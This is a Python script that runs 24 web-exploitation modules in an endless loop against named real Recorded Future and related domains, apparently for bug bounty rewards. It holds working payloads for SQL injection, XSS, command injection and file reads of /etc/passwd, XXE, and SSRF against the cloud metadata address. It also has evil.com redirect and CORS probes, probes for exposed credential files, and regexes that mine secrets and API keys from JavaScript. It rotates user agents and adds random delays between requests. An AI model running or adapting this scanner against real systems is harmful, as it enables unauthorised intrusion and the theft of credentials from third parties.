#!/usr/bin/env python3
"""
Recorded Future MEGA 24/7 Scanner — ALL Web Exploitation Techniques
Runs continuously. Ctrl+C to stop.
"""
import requests, re, json, time, sys, os, random, hashlib, urllib.parse
from pathlib import Path
from datetime import datetime

os.environ["PYTHONIOENCODING"] = "utf-8"
try: sys.stdout.reconfigure(encoding="utf-8")
except: pass

TARGETS = [
    "https://www.recordedfuture.com",
    "https://app.recordedfuture.com",
    "https://api.recordedfuture.com",
    "https://id.recordedfuture.com",
    "https://tria.ge",
    "https://hatching.io",
    "https://geminiadvisory.io",
]
RESULTS_DIR = Path("data/autopilot/mega")
RESULTS_DIR.mkdir(parents=True, exist_ok=True)
LOG = RESULTS_DIR / "findings.jsonl"
ALL = []
SEEN = set()

def ts(): return datetime.now().strftime("%H:%M:%S")
def log(m): print(f"[{ts()}] {m}")
def hdr():
    ua = random.choice(["Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36"])
    return {"User-Agent": ua, "Accept": "text/html,application/json", "Accept-Language": "en-US,en;q=0.9"}

def get(url, **kw):
    try: return requests.get(url, headers=hdr(), timeout=kw.get("t",8), allow_redirects=kw.get("r",True), verify=True)
    except: return None

def post(url, data=None, json_data=None, **kw):
    try:
        h = hdr()
        if json_data: h["Content-Type"] = "application/json"
        return requests.post(url, headers=h, data=data, json=json_data, timeout=kw.get("t",8), verify=True)
    except: return None

def finding(sev, typ, url, detail):
    key = hashlib.md5(f"{typ}{url}".encode()).hexdigest()
    if key in SEEN: return
    SEEN.add(key)
    f = {"severity":sev,"type":typ,"url":url,"detail":detail[:300],"time":str(datetime.now())}
    ALL.append(f)
    with open(LOG,"a",encoding="utf-8") as fh: fh.write(json.dumps(f)+"\n")
    e = {"CRITICAL":"[!!!]","HIGH":"[!!]","MEDIUM":"[!]","LOW":"[.]"}.get(sev,"[i]")
    log(f"  {e} {sev}: {typ} @ {url[:60]}")

# ═══ MODULE 1: Subdomain Enumeration ═══
def mod_subdomains(domain):
    log(f"[SUBDOMAINS] {domain}")
    words = ["admin","staging","dev","test","qa","uat","beta","internal","vpn","git","gitlab",
        "jenkins","jira","confluence","grafana","kibana","sentry","monitor","status","cdn",
        "static","auth","sso","login","sandbox","demo","api-v2","gateway","backup","legacy",
        "support","billing","data","analytics","ws","webhook","portal","dashboard","app","mail"]
    for w in words:
        r = get(f"https://{w}.{domain}", t=3)
        if r and r.status_code < 500:
            if w in ["admin","staging","dev","internal","jenkins","gitlab","jira","grafana","kibana","sentry","backup"]:
                finding("HIGH","SENSITIVE_SUBDOMAIN",f"https://{w}.{domain}",f"Sensitive subdomain live: {r.status_code}")
            else:
                log(f"  LIVE: {w}.{domain} [{r.status_code}]")

# ═══ MODULE 2: Sensitive File Exposure ═══
def mod_sensitive_files(url):
    log(f"[FILES] {url}")
    paths = ["/.env","/.git/config","/.git/HEAD","/.svn/entries","/.DS_Store","/backup.sql",
        "/db.sql","/.htaccess","/.htpasswd","/wp-config.php","/config.php","/config.yml",
        "/config.json","/.aws/credentials","/id_rsa","/.ssh/id_rsa","/server.key",
        "/debug/vars","/debug/pprof/","/actuator/env","/actuator/health","/actuator/configprops",
        "/actuator/mappings","/actuator/beans","/trace","/console","/admin/config",
        "/.dockerignore","/Dockerfile","/docker-compose.yml","/Makefile","/Procfile",
        "/package.json","/composer.json","/Gemfile","/requirements.txt","/.npmrc",
        "/crossdomain.xml","/clientaccesspolicy.xml","/phpinfo.php","/info.php",
        "/elmah.axd","/server-status","/server-info","/.well-known/security.txt",
        "/humans.txt","/security.txt","/readme.md","/README.md","/CHANGELOG.md",
        "/license.txt","/test.html","/test.php","/temp/","/tmp/","/log/","/logs/",
        "/error.log","/access.log","/debug.log","/.vscode/settings.json","/.idea/workspace.xml"]
    base = url.rstrip("/")
    for p in paths:
        r = get(f"{base}{p}", t=5, r=False)
        if not r: continue
        if r.status_code == 200:
            ct = r.headers.get("Content-Type","")
            sz = len(r.text)
            if sz > 10 and "text/html" not in ct:
                finding("CRITICAL","SENSITIVE_FILE_EXPOSED",f"{base}{p}",f"File accessible ({sz}B, {ct[:30]}): {r.text[:100]}")
            elif sz > 10 and p in ["/.env","/.git/config","/.aws/credentials","/id_rsa","/backup.sql"]:
                finding("CRITICAL","SENSITIVE_FILE_EXPOSED",f"{base}{p}",f"Critical file accessible: {r.text[:100]}")

# ═══ MODULE 3: SQL Injection ═══
def mod_sqli(url):
    log(f"[SQLi] {url}")
    payloads = ["'","''","' OR '1'='1","' OR 1=1--","\" OR 1=1--","1' ORDER BY 1--",
        "1 UNION SELECT NULL--","') OR ('1'='1","1; WAITFOR DELAY '0:0:5'--"]
    params = ["id","user","name","page","search","q","query","item","cat","category","sort","order","limit"]
    base = url.rstrip("/")
    for param in params:
        for payload in payloads[:3]:
            ep = urllib.parse.quote(payload)
            r = get(f"{base}/?{param}={ep}", t=10)
            if not r: continue
            errors = ["sql syntax","mysql","postgresql","sqlite","oracle","syntax error","unclosed quotation",
                "unterminated string","microsoft ole db","odbc","jdbc","sql server"]
            for err in errors:
                if err in r.text.lower():
                    finding("CRITICAL","SQL_INJECTION",f"{base}/?{param}={payload}",f"SQL error: {err}")
                    return

# ═══ MODULE 4: XSS (Reflected) ═══
def mod_xss(url):
    log(f"[XSS] {url}")
    payloads = ['<script>alert(1)</script>','"><img src=x onerror=alert(1)>','javascript:alert(1)',
        "'-alert(1)-'","<svg/onload=alert(1)>","<img src=x onerror=prompt(1)>"]
    params = ["q","search","name","user","redirect","url","callback","next","error","msg","message"]
    base = url.rstrip("/")
    for param in params:
        for payload in payloads[:3]:
            ep = urllib.parse.quote(payload)
            r = get(f"{base}/?{param}={ep}", t=8)
            if r and payload in r.text:
                finding("HIGH","REFLECTED_XSS",f"{base}/?{param}={payload}",f"Payload reflected unescaped in response")
                return

# ═══ MODULE 5: SSRF ═══
def mod_ssrf(url):
    log(f"[SSRF] {url}")
    targets_ssrf = ["http://169.254.169.254/latest/meta-data/","http://127.0.0.1:80",
        "http://[::1]","http://0177.0.0.1","http://2130706433","http://localhost"]
    params = ["url","uri","path","dest","redirect","site","html","feed","target","proxy"]
    base = url.rstrip("/")
    for param in params:
        for target in targets_ssrf[:2]:
            ep = urllib.parse.quote(target)
            r = get(f"{base}/?{param}={ep}", t=8)
            if r and any(k in r.text for k in ["ami-id","instance-id","local-hostname","meta-data","127.0.0.1"]):
                finding("CRITICAL","SSRF",f"{base}/?{param}={target}",f"SSRF confirmed - internal data in response")
                return

# ═══ MODULE 6: Command Injection ═══
def mod_cmdi(url):
    log(f"[CMDi] {url}")
    payloads = [";id","|id","$(id)","`id`",";cat /etc/passwd","| cat /etc/passwd"]
    params = ["cmd","exec","command","ping","query","host","ip","file","path"]
    base = url.rstrip("/")
    for param in params:
        for payload in payloads[:2]:
            ep = urllib.parse.quote(payload)
            r = get(f"{base}/?{param}={ep}", t=8)
            if r and any(k in r.text for k in ["uid=","root:x:0:0","bin/bash"]):
                finding("CRITICAL","COMMAND_INJECTION",f"{base}/?{param}={payload}",f"OS command execution confirmed")
                return

# ═══ MODULE 7: LFI/Path Traversal ═══
def mod_lfi(url):
    log(f"[LFI] {url}")
    payloads = ["../../../etc/passwd","....//....//....//etc/passwd","..%252f..%252f..%252fetc/passwd",
        "/etc/passwd","....\\....\\....\\windows\\win.ini","..\\..\\..\\windows\\win.ini"]
    params = ["file","path","page","template","include","doc","folder","style","lang"]
    base = url.rstrip("/")
    for param in params:
        for payload in payloads[:3]:
            ep = urllib.parse.quote(payload)
            r = get(f"{base}/?{param}={ep}", t=8)
            if r and any(k in r.text for k in ["root:x:0:0","bin/bash","[extensions]","[fonts]"]):
                finding("CRITICAL","LFI_PATH_TRAVERSAL",f"{base}/?{param}={payload}",f"Local file read confirmed")
                return

# ═══ MODULE 8: SSTI ═══
def mod_ssti(url):
    log(f"[SSTI] {url}")
    tests = [("{{7*7}}","49"),("{{7*'7'}}","7777777"),("${7*7}","49"),("<%=7*7%>","49"),("{7*7}","49")]
    params = ["name","template","q","search","user","msg","error"]
    base = url.rstrip("/")
    for param in params:
        for payload, expected in tests[:2]:
            ep = urllib.parse.quote(payload)
            r = get(f"{base}/?{param}={ep}", t=8)
            if r and expected in r.text:
                # Verify not false positive
                r2 = get(f"{base}/?{param}={urllib.parse.quote('{{99887*99887}}')}", t=8)
                if r2 and "9977416769" in r2.text:
                    finding("CRITICAL","SSTI",f"{base}/?{param}={payload}",f"Server-side template injection confirmed")
                    return

# ═══ MODULE 9: CORS Misconfiguration ═══
def mod_cors(url):
    log(f"[CORS] {url}")
    origins = ["https://evil.com","https://recordedfuture.com.evil.com","null"]
    for origin in origins:
        try:
            h = hdr(); h["Origin"] = origin
            r = requests.get(url, headers=h, timeout=5)
            acao = r.headers.get("Access-Control-Allow-Origin","")
            acac = r.headers.get("Access-Control-Allow-Credentials","")
            if acao == origin or (acao == "*" and acac.lower() == "true"):
                finding("HIGH","CORS_MISCONFIGURATION",url,f"Origin {origin} reflected. ACAO:{acao} ACAC:{acac}")
        except: pass

# ═══ MODULE 10: Open Redirect ═══
def mod_redirect(url):
    log(f"[REDIRECT] {url}")
    payloads = ["//evil.com","https://evil.com","/\\evil.com","//evil.com/%2f.."]
    params = ["url","redirect","next","return","returnTo","goto","target","dest","continue","redirect_uri","rurl"]
    base = url.rstrip("/")
    for param in params:
        for payload in payloads[:2]:
            try:
                r = requests.get(f"{base}/?{param}={payload}", headers=hdr(), timeout=5, allow_redirects=False)
                loc = r.headers.get("Location","")
                if "evil.com" in loc:
                    finding("MEDIUM","OPEN_REDIRECT",f"{base}/?{param}={payload}",f"Redirects to: {loc}")
                    return
            except: pass

# ═══ MODULE 11: CRLF Injection ═══
def mod_crlf(url):
    log(f"[CRLF] {url}")
    payloads = ["%0d%0aX-Injected: true","%0aX-Injected: true","%0d%0a%0d%0a<script>alert(1)</script>"]
    base = url.rstrip("/")
    for payload in payloads:
        r = get(f"{base}/{payload}", t=5, r=False)
        if r and "X-Injected" in str(r.headers):
            finding("HIGH","CRLF_INJECTION",f"{base}/{payload}","Header injection via CRLF confirmed")
            return

# ═══ MODULE 12: Host Header Injection ═══
def mod_host_header(url):
    log(f"[HOST-HDR] {url}")
    try:
        h = hdr(); h["Host"] = "evil.com"
        r = requests.get(url, headers=h, timeout=5, allow_redirects=False)
        if "evil.com" in r.text or "evil.com" in r.headers.get("Location",""):
            finding("HIGH","HOST_HEADER_INJECTION",url,"Host header value reflected in response/redirect")
    except: pass

# ═══ MODULE 13: GraphQL Introspection ═══
def mod_graphql(url):
    log(f"[GRAPHQL] {url}")
    for path in ["/graphql","/graphiql","/api/graphql","/gql","/v1/graphql"]:
        full = url.rstrip("/") + path
        r = post(full, json_data={"query":"{ __schema { types { name fields { name } } } }"}, t=8)
        if r and r.status_code == 200 and "__schema" in r.text:
            finding("MEDIUM","GRAPHQL_INTROSPECTION",full,f"Schema introspection enabled. Types: {r.text[:150]}")
            return

# ═══ MODULE 14: JWT Analysis ═══
def mod_jwt(url):
    log(f"[JWT] {url}")
    r = get(url)
    if not r: return
    tokens = re.findall(r'eyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}', r.text)
    for token in tokens[:3]:
        import base64
        try:
            header = json.loads(base64.urlsafe_b64decode(token.split(".")[0] + "=="))
            if header.get("alg") == "none" or header.get("alg") == "HS256":
                finding("HIGH","JWT_WEAK_ALGORITHM",url,f"JWT with {header.get('alg')} found: {token[:50]}...")
        except: pass

# ═══ MODULE 15: API Documentation Exposure ═══
def mod_api_docs(url):
    log(f"[API-DOCS] {url}")
    for path in ["/swagger.json","/openapi.json","/swagger/","/swagger-ui/","/redoc/","/api-docs","/docs"]:
        full = url.rstrip("/") + path
        r = get(full, t=5)
        if r and r.status_code == 200:
            ct = r.headers.get("Content-Type","")
            if "json" in ct or "swagger" in r.text.lower() or "openapi" in r.text.lower():
                finding("MEDIUM","API_DOCS_EXPOSED",full,f"API documentation accessible ({ct[:30]})")
                return

# ═══ MODULE 16: JS Secret Mining ═══
def mod_js_secrets(url):
    log(f"[JS-SECRETS] {url}")
    r = get(url)
    if not r: return
    js_links = re.findall(r'src="([^"]*\.js[^"]*)"', r.text)
    patterns = {
        "AWS_KEY": r'AKIA[0-9A-Z]{16}', "PRIVATE_KEY": r'-----BEGIN (RSA )?PRIVATE KEY-----',
        "SLACK_HOOK": r'hooks\.slack\.com/services/T\w+/B\w+/\w+',
        "GITHUB_TOKEN": r'gh[pso]_[A-Za-z0-9_]{36,}', "GOOGLE_API": r'AIza[0-9A-Za-z_-]{35}',
        "SENTRY_DSN": r'https://[a-f0-9]+@[a-z0-9.]*sentry[a-z0-9.]*/\d+',
        "STRIPE_KEY": r'sk_live_[0-9a-zA-Z]{24,}', "FIREBASE": r'[a-z0-9-]+\.firebaseio\.com',
        "INTERNAL_URL": r'https?://[a-z0-9.-]+\.(internal|corp|local)\.[a-z]+',
    }
    for link in js_links[:15]:
        if not link.startswith("http"):
            link = url.rstrip("/") + (link if link.startswith("/") else "/" + link)
        jr = get(link, t=5)
        if not jr: continue
        for name, pat in patterns.items():
            for m in re.findall(pat, jr.text)[:2]:
                val = m if isinstance(m,str) else str(m)
                idx = jr.text.find(val)
                ctx = jr.text[max(0,idx-30):idx+len(val)+30] if idx>-1 else ""
                if "replace(" in ctx or "regex" in ctx.lower(): continue
                sev = "HIGH" if name in ["AWS_KEY","PRIVATE_KEY","STRIPE_KEY"] else "MEDIUM"
                finding(sev,f"JS_SECRET_{name}",link,f"{name}: {val[:60]}")

# ═══ MODULE 17: Header Security Check ═══
def mod_headers(url):
    log(f"[HEADERS] {url}")
    r = get(url)
    if not r: return
    for h_name in ["Strict-Transport-Security","Content-Security-Policy","X-Content-Type-Options","X-Frame-Options"]:
        if h_name not in r.headers:
            finding("LOW",f"MISSING_{h_name.upper().replace('-','_')}",url,f"Missing security header: {h_name}")
    for k,v in r.headers.items():
        if any(x in k.lower() for x in ["x-powered","x-aspnet","x-debug","x-runtime","server"]):
            if v.lower() not in ["cloudflare","nginx","apache"]:
                finding("LOW","SERVER_INFO_LEAK",url,f"{k}: {v}")
        if any(x in v.lower() for x in ["internal","staging","debug","test.","dev."]):
            finding("MEDIUM","INTERNAL_INFO_HEADER",url,f"{k}: {v}")

# ═══ MODULE 18: XXE ═══
def mod_xxe(url):
    log(f"[XXE] {url}")
    xxe_payload = '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>'
    for path in ["/api/","/upload","/import","/xml","/parse","/feed"]:
        full = url.rstrip("/") + path
        try:
            h = hdr(); h["Content-Type"] = "application/xml"
            r = requests.post(full, data=xxe_payload, headers=h, timeout=8)
            if r and any(k in r.text for k in ["root:x:0:0","bin/bash"]):
                finding("CRITICAL","XXE",full,"XML External Entity injection - file read confirmed")
                return
        except: pass

# ═══ MODULE 19: Prototype Pollution ═══
def mod_prototype_pollution(url):
    log(f"[PROTO-POLL] {url}")
    payloads = ["__proto__[test]=polluted","constructor.prototype.test=polluted","__proto__.test=polluted"]
    base = url.rstrip("/")
    for p in payloads:
        r = get(f"{base}/?{p}", t=5)
        if r and "polluted" in r.text:
            finding("HIGH","PROTOTYPE_POLLUTION",f"{base}/?{p}","Prototype pollution vector found")
            return

# ═══ MODULE 20: HTTP Request Smuggling ═══
def mod_smuggling(url):
    log(f"[SMUGGLE] {url}")
    try:
        h = hdr()
        h["Transfer-Encoding"] = "chunked"
        h["Content-Length"] = "4"
        r = requests.post(url, data="0\r\n\r\nSMUGGLED", headers=h, timeout=5)
        if r and r.status_code in [400,500]:
            finding("MEDIUM","HTTP_SMUGGLING_CANDIDATE",url,f"Server reacted to TE/CL conflict: {r.status_code}")
    except: pass

# ═══ MODULE 21: Wayback Machine Recon ═══
def mod_wayback(url):
    log(f"[WAYBACK] {url}")
    domain = url.replace("https://","").replace("http://","").rstrip("/")
    r = get(f"https://web.archive.org/cdx/search/cdx?url={domain}/*&output=json&limit=50&fl=original&collapse=urlkey", t=15)
    if not r: return
    try:
        data = r.json()
        for row in data[1:]:
            u = row[0]
            if any(ext in u for ext in [".sql",".bak",".zip",".tar",".env",".config",".log",".key",".pem"]):
                finding("MEDIUM","WAYBACK_SENSITIVE_URL",u,f"Historical sensitive file found in Wayback")
    except: pass

# ═══ MODULE 22: Robots.txt / Sitemap Analysis ═══
def mod_robots(url):
    log(f"[ROBOTS] {url}")
    base = url.rstrip("/")
    r = get(f"{base}/robots.txt", t=5)
    if r and r.status_code == 200:
        for line in r.text.splitlines():
            if line.lower().startswith("disallow:"):
                path = line.split(":",1)[1].strip()
                if any(k in path.lower() for k in ["admin","internal","secret","private","debug","config","backup","api"]):
                    finding("LOW","ROBOTS_SENSITIVE_PATH",f"{base}{path}",f"Sensitive path in robots.txt: {path}")

# ═══ MODULE 23: NoSQL Injection ═══
def mod_nosqli(url):
    log(f"[NoSQLi] {url}")
    payloads = ['{"$gt":""}','{"$ne":""}','{"$regex":".*"}']
    params = ["user","username","email","id","name"]
    base = url.rstrip("/")
    for param in params:
        for payload in payloads:
            ep = urllib.parse.quote(payload)
            r = get(f"{base}/?{param}={ep}", t=8)
            if r and r.status_code == 200 and len(r.text) > 500:
                r2 = get(f"{base}/?{param}=nonexistent_value_xyz", t=8)
                if r2 and len(r.text) > len(r2.text) * 2:
                    finding("HIGH","NOSQL_INJECTION",f"{base}/?{param}={payload}","Response size difference suggests NoSQL injection")
                    return

# ═══ MODULE 24: OAuth Misconfiguration ═══
def mod_oauth(url):
    log(f"[OAUTH] {url}")
    base = url.rstrip("/")
    for path in ["/.well-known/openid-configuration","/oauth/authorize","/oauth/token","/auth/realms/"]:
        r = get(f"{base}{path}", t=5)
        if r and r.status_code == 200 and "json" in r.headers.get("Content-Type",""):
            try:
                data = r.json()
                finding("LOW","OAUTH_ENDPOINT_FOUND",f"{base}{path}",f"OAuth endpoint accessible: {json.dumps(data)[:150]}")
            except: pass

# ═══ MAIN LOOP ═══
def run_cycle(cycle):
    log(f"\n{'='*60}")
    log(f"  CYCLE #{cycle} | Findings: {len(ALL)} | {datetime.now().strftime('%Y-%m-%d %H:%M')}")
    log(f"{'='*60}")
    
    modules = [mod_sensitive_files, mod_sqli, mod_xss, mod_ssrf, mod_cmdi, mod_lfi,
        mod_ssti, mod_cors, mod_redirect, mod_crlf, mod_host_header, mod_graphql,
        mod_jwt, mod_api_docs, mod_js_secrets, mod_headers, mod_xxe,
        mod_prototype_pollution, mod_smuggling, mod_wayback, mod_robots, mod_nosqli, mod_oauth]
    
    for target in TARGETS:
        log(f"\n--- {target} ---")
        for mod in modules:
            try: mod(target)
            except Exception as e: log(f"  ERR: {mod.__name__}: {e}")
            time.sleep(random.uniform(0.5, 2))
    
    if cycle % 3 == 1:
        for d in ["recordedfuture.com","tria.ge","hatching.io","geminiadvisory.io"]:
            try: mod_subdomains(d)
            except: pass
    
    out = RESULTS_DIR / f"cycle_{cycle}_{int(time.time())}.json"
    out.write_text(json.dumps(ALL, indent=2, default=str), encoding="utf-8")
    log(f"\nCycle #{cycle} done. {len(ALL)} total findings -> {out.name}")

def main():
    log(f"{'='*60}")
    log(f"  RECORDED FUTURE MEGA 24/7 SCANNER")
    log(f"  24 attack modules x 7 targets = 168 checks per cycle")
    log(f"  Rewards: P1=$5,000 | P2=$2,000 | P3=$750 | P4=$250")
    log(f"  Ctrl+C to stop")
    log(f"{'='*60}")
    cycle = 0
    while True:
        try:
            cycle += 1
            run_cycle(cycle)
            delay = 300
            log(f"Sleeping {delay//60}m before next cycle...")
            time.sleep(delay)
        except KeyboardInterrupt:
            log(f"Stopped. {len(ALL)} findings total.")
            final = RESULTS_DIR / f"final_{int(time.time())}.json"
            final.write_text(json.dumps(ALL, indent=2, default=str), encoding="utf-8")
            log(f"Saved: {final}")
            break
        except Exception as e:
            log(f"Cycle error: {e}. Retrying in 60s...")
            time.sleep(60)

if __name__ == "__main__":
    main()
